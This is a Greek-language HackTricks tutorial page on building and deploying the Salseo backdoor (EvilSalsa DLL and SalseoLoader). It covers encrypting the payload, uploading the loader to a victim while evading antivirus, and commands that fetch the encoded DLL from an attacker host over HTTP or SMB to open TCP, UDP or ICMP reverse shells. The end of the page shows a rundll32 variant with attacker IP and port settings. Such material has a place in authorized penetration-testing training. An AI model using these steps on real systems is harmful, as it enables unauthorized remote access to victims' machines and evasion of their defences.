# Salseo

{{#include ../banners/hacktricks-training.md}}

## Συγκέντρωση των δυαδικών αρχείων

Κατεβάστε τον πηγαίο κώδικα από το github και συγκεντρώστε το **EvilSalsa** και το **SalseoLoader**. Θα χρειαστείτε εγκατεστημένο το **Visual Studio** για να συγκεντρώσετε τον κώδικα.

Συγκεντρώστε αυτά τα έργα για την αρχιτεκτονική της Windows συσκευής όπου θα τα χρησιμοποιήσετε (Αν τα Windows υποστηρίζουν x64, συγκεντρώστε τα για αυτές τις αρχιτεκτονικές).

Μπορείτε να **επιλέξετε την αρχιτεκτονική** μέσα στο Visual Studio στην **αριστερή καρτέλα "Build"** στην **"Platform Target".**

(**Αν δεν μπορείτε να βρείτε αυτές τις επιλογές, πατήστε στην **"Project Tab"** και στη συνέχεια στην **"\<Project Name> Properties"**)

![](<../images/image (132).png>)

Στη συνέχεια, κατασκευάστε και τα δύο έργα (Build -> Build Solution) (Μέσα στα logs θα εμφανιστεί η διαδρομή του εκτελέσιμου):

![](<../images/image (1) (2) (1) (1) (1).png>)

## Προετοιμάστε το Backdoor

Πρώτα απ' όλα, θα χρειαστεί να κωδικοποιήσετε το **EvilSalsa.dll.** Για να το κάνετε αυτό, μπορείτε να χρησιμοποιήσετε το python script **encrypterassembly.py** ή μπορείτε να συγκεντρώσετε το έργο **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Εντάξει, τώρα έχετε όλα όσα χρειάζεστε για να εκτελέσετε όλα τα πράγματα του Salseo: το **encoded EvilDalsa.dll** και το **binary of SalseoLoader.**

**Ανεβάστε το SalseoLoader.exe binary στη μηχανή. Δεν θα πρέπει να ανιχνευτούν από κανένα AV...**

## **Εκτέλεση του backdoor**

### **Λήψη ενός TCP reverse shell (κατεβάζοντας το encoded dll μέσω HTTP)**

Θυμηθείτε να ξεκινήσετε ένα nc ως τον listener του reverse shell και έναν HTTP server για να σερβίρετε το encoded evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Λήψη ενός UDP reverse shell (κατέβασμα κωδικοποιημένου dll μέσω SMB)**

Θυμηθείτε να ξεκινήσετε ένα nc ως τον listener του reverse shell και έναν SMB server για να εξυπηρετήσει το κωδικοποιημένο evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Λήψη ICMP reverse shell (κωδικοποιημένο dll ήδη μέσα στον θύμα)**

**Αυτή τη φορά χρειάζεστε ένα ειδικό εργαλείο στον πελάτη για να λάβετε το reverse shell. Κατεβάστε:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Απενεργοποίηση Απαντήσεων ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Εκτέλεση του πελάτη:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Μέσα στον θύμα, ας εκτελέσουμε το salseo πράγμα:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Συγκέντρωση του SalseoLoader ως DLL που εξάγει τη βασική λειτουργία

Ανοίξτε το έργο SalseoLoader χρησιμοποιώντας το Visual Studio.

### Προσθέστε πριν από τη βασική λειτουργία: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Εγκαταστήστε το DllExport για αυτό το έργο

#### **Εργαλεία** --> **Διαχειριστής Πακέτων NuGet** --> **Διαχείριση Πακέτων NuGet για τη Λύση...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Αναζητήστε το πακέτο DllExport (χρησιμοποιώντας την καρτέλα Αναζήτησης) και πατήστε Εγκατάσταση (και αποδεχτείτε το αναδυόμενο παράθυρο)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Στο φάκελο του έργου σας έχουν εμφανιστεί τα αρχεία: **DllExport.bat** και **DllExport_Configure.bat**

### **Α**πεγκαταστήστε το DllExport

Πατήστε **Απεγκατάσταση** (ναι, είναι περίεργο αλλά εμπιστευτείτε με, είναι απαραίτητο)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Έξοδος από το Visual Studio και εκτέλεση του DllExport_configure**

Απλά **έξοδος** από το Visual Studio

Στη συνέχεια, πηγαίνετε στο **φάκελο SalseoLoader** σας και **εκτελέστε το DllExport_Configure.bat**

Επιλέξτε **x64** (αν πρόκειται να το χρησιμοποιήσετε μέσα σε ένα x64 box, αυτό ήταν η περίπτωση μου), επιλέξτε **System.Runtime.InteropServices** (μέσα στο **Namespace για DllExport**) και πατήστε **Εφαρμογή**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Ανοίξτε ξανά το έργο με το Visual Studio**

**\[DllExport]** δεν θα πρέπει πλέον να επισημαίνεται ως σφάλμα

![](<../images/image (8) (1).png>)

### Δημιουργία της λύσης

Επιλέξτε **Τύπος Έξοδου = Βιβλιοθήκη Κλάσης** (Έργο --> Ιδιότητες SalseoLoader --> Εφαρμογή --> Τύπος εξόδου = Βιβλιοθήκη Κλάσης)

![](<../images/image (10) (1).png>)

Επιλέξτε **πλατφόρμα x64** (Έργο --> Ιδιότητες SalseoLoader --> Δημιουργία --> Στόχος πλατφόρμας = x64)

![](<../images/image (9) (1) (1).png>)

Για να **δημιουργήσετε** τη λύση: Δημιουργία --> Δημιουργία Λύσης (Μέσα στην κονσόλα εξόδου θα εμφανιστεί η διαδρομή της νέας DLL)

### Δοκιμάστε την παραγόμενη DLL

Αντιγράψτε και επικολλήστε την DLL όπου θέλετε να τη δοκιμάσετε.

Εκτελέστε:
```
rundll32.exe SalseoLoader.dll,main
```
Αν δεν εμφανιστεί σφάλμα, πιθανότατα έχετε μια λειτουργική DLL!!

## Αποκτήστε ένα shell χρησιμοποιώντας τη DLL

Μην ξεχάσετε να χρησιμοποιήσετε έναν **HTTP** **server** και να ρυθμίσετε έναν **nc** **listener**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
